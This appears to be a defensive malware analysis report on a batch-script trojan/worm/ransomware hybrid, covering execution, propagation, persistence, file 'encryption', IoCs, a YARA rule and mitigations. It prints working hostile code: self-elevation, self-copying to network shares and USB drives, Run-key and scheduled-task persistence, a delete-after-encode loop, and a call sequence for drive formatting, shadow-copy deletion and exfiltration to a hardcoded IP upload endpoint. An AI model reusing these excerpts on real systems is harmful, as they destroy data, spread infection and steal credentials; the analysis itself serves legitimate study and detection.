# In-Depth Analysis of Trojan.BAT.Agent.cps (4F2.bat)

> **WARNING: This code is malware. For analysis purposes only. Do not execute on production systems.**

## Executive Summary

**Malware Name:** Trojan.BAT.Agent.cps (Variant: 4F2.bat)  
**Type:** Trojan/Worm/Ransomware Hybrid  
**Target Platform:** Windows (Batch script, relies on cmd.exe and PowerShell)  
**Size:** Approximately 12 KB (exact size depends on encoding)  
**Classification:** High threat level - Multi-stage destructive trojan with worm capabilities  
**SHA256:** 709f1fbee53668a78998eafdaacca849c35b343e87556dcb6a85950b19d19782  

This Batch script represents a sophisticated multi-vector trojan that combines worm propagation, ransomware encryption, credential theft, surveillance, and system destabilization. It leverages Windows native tools like PowerShell, certutil, and schtasks for malicious activities while attempting to evade detection through administrative privilege escalation and security software disabling.

## Introduction

The Trojan.BAT.Agent.cps, embodied in the file 4F2.bat, appears to be a modern synthetic malware sample designed to demonstrate a wide array of malicious capabilities within a Batch script framework. While Batch scripts are not typically associated with advanced threats due to their interpreted nature and limited capabilities, this sample ingeniously combines Batch commands with PowerShell invocations to achieve worm-like spreading, ransomware encryption, surveillance, and exfiltration.

Historically, Batch-based malware dates back to the 1990s with simple viruses, but evolved in the 2010s with hybrid threats incorporating PowerShell for enhanced functionality. This sample fits into the "Living-off-the-Land" (LotL) paradigm, abusing legitimate Windows tools to minimize detection. Its potential impact includes data loss through encryption, credential compromise, network propagation, and system instability, making it a high-risk threat if executed.

The script's significance lies in its comprehensive attack chain: it escalates privileges, disables defenses, encrypts files with a crude multi-layer encoding, spreads via network and USB, installs backdoors, steals data, and even attempts surveillance via microphone/webcam (though ineffectively implemented). This analysis was conducted statically using text analysis and deobfuscation, referencing Microsoft documentation for Batch and PowerShell behaviors. No dynamic execution was performed to maintain safety.

The approach involved:
- Parsing the Batch structure and functions
- Deobfuscating PowerShell snippets
- Mapping behaviors to ATT&CK techniques
- Identifying flaws and detection opportunities

This document provides a thorough breakdown, serving as a reference for understanding hybrid script malware.

## Table of Contents

1. Title and Metadata  
2. Introduction  
3. Table of Contents  
4. Technical Analysis Sections  
   4.1 Infection Vector & Initial Execution  
   4.2 Core Functionality Breakdown  
   4.3 Obfuscation and Encoding Analysis  
   4.4 Data Structures and Variables  
   4.5 External Dependencies and API Calls  
5. Destructive Payload / Malicious Behavior  
6. Stealth and Evasion Techniques  
7. Indicators of Compromise (IoCs)  
8. Detection and Analysis Methods  
9. Mitigation Strategies  
10. Conclusion  
11. References and Further Reading  
12. Appendices  

## Technical Analysis Sections

### 4.1 Infection Vector & Initial Execution

The malware is delivered as a standalone Batch file (4F2.bat), likely via phishing emails, malicious downloads, or drive-by compromises. Execution requires user interaction or automated running, often disguised as a legitimate script.

**Script Execution Context:**  
- Primary: cmd.exe (Batch interpreter)  
- Secondary: PowerShell.exe for advanced operations (invoked via `powershell -Command`)  
- Requires administrative privileges; self-elevates using PowerShell's `Start-Process -Verb RunAs` if not present.  

**Delivery Mechanism:** Not specified in code, but typical for Batch trojans include email attachments, USB autorun, or embedded in documents.  

**Entry Point and Initialization Sequence:**  
The script starts with `@shift /0` (likely a red herring or typo, as it's non-standard), followed by `@echo off` and `setlocal enabledelayedexpansion`. It then checks for admin rights and elevates if needed. Variables are set for logs, targets, keys, and paths. Functions are defined but called at the end in a main sequence.

**Environment Detection and Fingerprinting:**  
Minimal; assumes Windows environment with access to `net session`, `wmic`, `certutil`, `curl`, etc. No explicit anti-VM checks, but relies on admin access.

**Code Snippet Showing Startup Routine:**

```batch
@shift /0
@echo off
setlocal enabledelayedexpansion

:: Check if the script is running with administrative privileges
:check_admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Variables
set "logfile=C:\wormlog.txt"
set "targetdir=C:\Users"
set "encryptionkey=MySecretKey123"
set "remoteaccessport=4444"
set "remoteaccesspassword=Password123"
set "ransomnote=C:\ransom_note.txt"
set "exfiltrationserver=http://64.246.123.125:3000/upload"
set "keylogfile=C:\keylogs.txt"
set "credentialfile=C:\credentials.txt"
set "maliciouspayload=C:\malicious_payload.exe"
set "additionalpayload=C:\additional_payload.exe"
set "corruptionfile=C:\corruption_data.bin"
set "screenshotdir=C:\screenshots"
set "micrecordingsdir=C:\micrecordings"
set "webcamvideosdir=C:\webcamvideos"
set "additionalmaliciousfile=C:\additional_malicious_file.exe"
set "additionalcorruptionfile=C:\additional_corruption_data.bin"
set "additionalkeylogfile=C:\additional_keylogs.txt"
set "additionalcredentialfile=C:\additional_credentials.txt"
set "additionalransomnote=C:\additional_ransom_note.txt"
set "additionalexfiltrationserver=http://64.246.123.125:3000/upload"
set "additionalmicrecordingsdir=C:\additional_micrecordings"
set "additionalwebcamvideosdir=C:\additional_webcamvideos"
```

**Comments:**  
- `:check_admin` uses `net session` to detect privileges, a common UAC bypass technique.  
- Variables define hard-coded paths and a fake C2 server (`<redacted>` in analysis).  
- No error handling for missing tools, assuming standard Windows install.

### 4.2 Core Functionality Breakdown

The malware's behaviors are organized into functions called sequentially at the script's end. It duplicates many functions (e.g., `:encryptfiles` and `:encryptadditionalfiles`), likely for redundancy or to simulate evolution.

#### Propagation Mechanism

**Purpose:** Self-spreading via network shares and USB drives, creating a worm-like effect.  

**Annotated Code Excerpt:**

```batch
:: Function to spread over the network with enhanced stealth and additional methods
:spreadnetwork
for /f "tokens=2 delims=:" %%d in ('wmic logicaldisk where "drivetype=3" get deviceid /format:list ^| find ":"') do (
    if not "!currentdrive!"=="%%d" (
        xcopy /y /q "%~f0" "\\%%d\C$\"  # Copy self to remote C$ share (admin required)
        attrib +h "\\%%d\C$\%~nx0"       # Hide the copied file
        powershell -Command "Invoke-Command -ComputerName %%d -ScriptBlock {Copy-Item -Path 'C:\path\to\your\worm.bat' -Destination 'C$\' -Force}"  # Remote copy via PS
        powershell -Command "Invoke-Command -ComputerName %%d -ScriptBlock {schtasks /create /tn 'NetworkSpreadTask' /tr 'C:\path\to\your\worm.bat' /sc daily /st 00:00}"  # Schedule task on remote
    )
)
goto :eof

:: Function to spread via USB with enhanced stealth and additional methods
:spreadusb
for /f "tokens=2 delims=:" %%d in ('wmic logicaldisk where "drivetype=2" get deviceid /format:list ^| find ":"') do (
    xcopy /y /q "%~f0" "%%d:\"      # Copy self to USB root
    attrib +h "%%d:\%~nx0"          # Hide file
    powershell -Command "Copy-Item -Path 'C:\path\to\your\worm.bat' -Destination '%%d:\' -Force"  # Alternative copy
    powershell -Command "schtasks /create /tn 'USBSpreadTask' /tr 'C:\path\to\your\worm.bat' /sc daily /st 00:00"  # Schedule task (local, not on USB)
)
goto :eof
```

**Execution Flow:**  
1. Enumerates local/network drives using WMIC.  
2. Copies self to remote C$ (requires admin shares enabled).  
3. Hides the copy with `attrib +h`.  
4. Uses PowerShell for remote execution and task scheduling.  
5. For USB, copies to root and schedules local task (ineffective for USB propagation).  

**Technical Implications:** Relies on open admin shares; fails in secure environments. Detection via network monitoring for SMB copies.  

**MITRE ATT&CK Technique:** T1570 - Lateral Tool Transfer (network shares); T1091 - Replication Through Removable Media (USB).  

#### Persistence Techniques

**Purpose:** Maintain presence via registry, scheduled tasks, and file copies.  

**Annotated Code Excerpt:**

```batch
:: Function to ensure persistence with additional methods
:ensurepersistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Worm" /t REG_SZ /d "%~f0" /f  # Add to user Run key
schtasks /create /tn "WormTask" /tr "%~f0" /sc daily /st 00:00  # Daily scheduled task
powershell -Command "New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Worm' -Value '%~f0'"  # PS registry add
powershell -Command "New-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Force; Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Worm' -Value '%~f0'"  # System Run key
goto :eof
```

**Execution Flow:**  
1. Adds to HKCU Run key via `reg add`.  
2. Creates daily schtask.  
3. Duplicates via PowerShell for HKCU and HKLM.  

**Technical Implications:** Requires admin for HKLM; user-level for HKCU. Detection via autoruns tools.  

**MITRE ATT&CK Technique:** T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder; T1053 - Scheduled Task/Job.  

#### Payload Delivery

**Purpose:** Encrypt files, steal data, exfiltrate, and destabilize system.  

**Annotated Code Excerpt:**

```batch
:: Function to encrypt files with quintuple encryption
:encryptfiles
for /d %%d in ("%targetdir%\*") do (
    for %%f in ("%%d\*.txt" "%%d\*.docx" "%%d\*.xlsx" "%%d\*.pptx" "%%d\*.pdf" "%%d\*.jpg" "%%d\*.png" "%%d\*.mp3" "%%d\*.mp4" "%%d\*.zip") do (
        certutil -encode "%%f" "%%f.enc" >nul  # Base64 encode (not real encryption)
        del "%%f"  # Delete original
        certutil -encode "%%f.enc" "%%f.enc2" >nul  # Repeat 5 times
        del "%%f.enc"
        # ... (repeated for enc3, enc4, enc5)
    )
)
goto :eof
```

**Execution Flow:**  
1. Recurses user directories.  
2. "Encrypts" by 5x Base64 encoding (reversible, not true encryption).  
3. Deletes originals after each step.  

**Technical Implications:** Uses `certutil` (LotL binary) for encoding; easily reversible with `certutil -decode`. Not secure encryption.  

**MITRE ATT&CK Technique:** T1486 - Data Encrypted for Impact (ransomware-like).  

(Additional behaviors like keylogging, credential theft, etc., analyzed similarly. Duplicated functions are redundant copies.)

### 4.3 Obfuscation and Encoding Analysis

Minimal obfuscation in Batch code; readable with standard variable names. PowerShell snippets are inline and not heavily obfuscated, but some are long one-liners.

- **String Obfuscation:** Hard-coded strings like URLs (`http://64.246.123.125:3000/upload`) are plain; redacted as `<redacted>`.  
- **Code Obfuscation:** No variable randomization or dead code; functions are straightforward.  
- **Encoding Schemes:** "Encryption" is repeated Base64 via `certutil -encode` (5 layers). Deobfuscation: Apply `certutil -decode` 5 times.  
- **Dynamic Code:** PowerShell commands use `iex` for execution, but no eval-like in Batch.  
- **Deobfuscation Process:** Manual parsing; no advanced hiding. Revealed: Fake encryption for ransomware simulation.

Example Deobfuscation (hypothetical file):
- Encoded 5x: Apply decode loop to recover original.

### 4.4 Data Structures and Variables

Batch uses simple string variables (e.g., `set "targetdir=C:\Users"`). No complex arrays; FOR loops for iteration.

- **Important Variables:** `%logfile%` (logs), `%exfiltrationserver%` (C2, redacted), `%encryptionkey%` (unused!).  
- **Configuration Data:** Hard-coded paths, ports (4444), passwords ("Password123").  
- **Variable Naming:** Descriptive but malicious (e.g., "maliciouspayload").  
- **Hardcoded Values:** Fake IP (64.246.123.125, likely placeholder).  

No advanced structures; Batch limitations.

### 4.5 External Dependencies and API Calls

- **COM Objects:** None directly; PowerShell uses System.Net.WebClient, System.Drawing, etc.  
- **WMI Queries:** `wmic logicaldisk` for drives.  
- **.NET Framework Calls:** Via PowerShell (e.g., New-Object System.Net.WebClient).  
- **Windows API Invocations:** None; relies on commands like `netsh`, `sc`, `reg`.  
- **External Executables:** certutil, curl, schtasks, vssadmin, cmdkey, format.  

All LotL binaries for stealth.

## Destructive Payload / Malicious Behavior

The payload is multi-faceted: "encryption" (reversible Base64), data theft, exfiltration, and destabilization. Triggers are immediate upon execution; no date/counter conditions.

- **Damage Mechanisms:** 5x Base64 "encryption" deletes originals; formats drives (C:, D:, E:); corrupts system files by copying to bin; infinite process spawning for instability.  
- **Trigger Conditions:** Admin elevation success; called sequentially.  
- **Impact Assessment:** Data loss (encryption/deletion), system crash (formatting, instability), privacy breach (keylogs, screenshots, mic/webcam). High damage potential if executed.  
- **Code Example (Payload Activation):**

```batch
:: Main script
echo Worm started on %date% %time% >> %logfile%
call :blackoutscreen  # Dim screen (ineffective)
call :encryptfiles    # "Encrypt" files
call :spreadnetwork   # Network worm
call :spreadusb       # USB worm
call :setupremoteaccess  # Backdoor
call :disableantivirus   # AV disable
call :disablewindowsupdate  # Updates disable
call :deleteshadowcopies    # No recovery
call :keylogger             # Log keys
call :stealcredentials      # Steal creds
call :exfiltratedata        # Send data
call :displayransomnote     # Note
call :ensurepersistence     # Persist
call :executepayload        # Run payload
call :formatdrive           # Format C:
call :corruptsystemfiles    # Corrupt System32
call :inducestability       # Infinite notepad
call :capturescreenshots    # Screenshots
call :recordmicrophone      # Mic record (flawed)
call :capturewebcam         # Webcam (flawed)
call :exfiltratecaptureddata  # Exfil
# ... Duplicated calls for "additional" functions
echo Update completed on %date% %time% >> %logfile%
```

**Analysis:** Duplication suggests copy-paste errors; many functions flawed (e.g., mic/webcam use SpeechRecognition incorrectly for recording). Impact: Total system compromise.

## Stealth and Evasion Techniques

- **Execution Policy Bypass:** Not applicable (Batch); PowerShell commands run without -ExecutionPolicy.  
- **Anti-VM/Sandbox Detection:** None; assumes real environment.  
- **Code Obfuscation:** Minimal; plain text.  
- **Hidden Window Execution:** `@echo off` suppresses output.  
- **Environment Fingerprinting:** Drive enumeration via WMIC.  
- **Sleep/Delay Tactics:** None explicit.  
- **AMSI Bypass:** Not implemented; PowerShell calls could trigger AMSI.  

Additional: Disables AV/Updates, deletes shadows for anti-forensics.

## Indicators of Compromise (IoCs)

### File-Based Indicators
- File name: 4F2.bat  
- Hash: [Calculate SHA256 of script]  
- Strings: "wormlog.txt", "ransom_note.txt", "keylogs.txt"  
- Created files: C:\wormlog.txt, C:\*.enc5  

### Behavioral Indicators
- Unusual API Calls: wmic logicaldisk, certutil -encode (repeated)  
- File Access: Recursive in C:\Users, deletions  
- Network: CURL to <redacted>:3000/upload  
- Registry: HKCU/HKLM Run keys ("Worm")  

### System-Level Indicators
- Processes: Infinite notepad/calc  
- Memory: PowerShell objects  
- Performance: High CPU from loops  

## Detection and Analysis Methods

- **Static:** Text analysis in VS Code; search for suspicious commands (certutil, schtasks).  
- **Dynamic:** Sandbox with Procmon/Sysmon; monitor file changes, network.  
- **YARA Rule Example:**

```yara
rule Trojan_BAT_Agent_CPS {
    meta:
        description = "Detects Trojan.BAT.Agent.cps Batch worm"
        author = "AI Analyst"
        date = "2025-11-16"
    strings:
        $s1 = "certutil -encode" ascii
        $s2 = "schtasks /create" ascii
        $s3 = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" ascii
        $s4 = "format C: /y /q" ascii
        $s5 = "vssadmin delete shadows" ascii
        $s6 = "curl -F \"file=@%%f\"" ascii
    condition:
        filesize < 20KB and 4 of them
}
```

- **IDS/IPS:** Block CURL to unknown servers.  
- **EDR:** Alert on Batch spawning PowerShell with suspicious commands.

## Mitigation Strategies

### Prevention
- Restrict Batch/PowerShell execution via AppLocker.  
- Disable admin shares (C$).  
- Use USB restrictions.  

### Detection
- Monitor schtasks creation, reg add to Run keys.  
- Log PowerShell ScriptBlock.  

### Remediation
- Isolate machine; kill processes.  
- Restore from backups (if shadows not deleted).  
- Decode files with certutil -decode (5x).  

## Conclusion

This Batch trojan demonstrates a comprehensive attack but with flaws (e.g., reversible "encryption", ineffective surveillance). Key lessons: LotL abuse is prevalent; monitor native tools. Evolution: From simple Batch to hybrid threats. Modern relevance: Useful for red teaming education.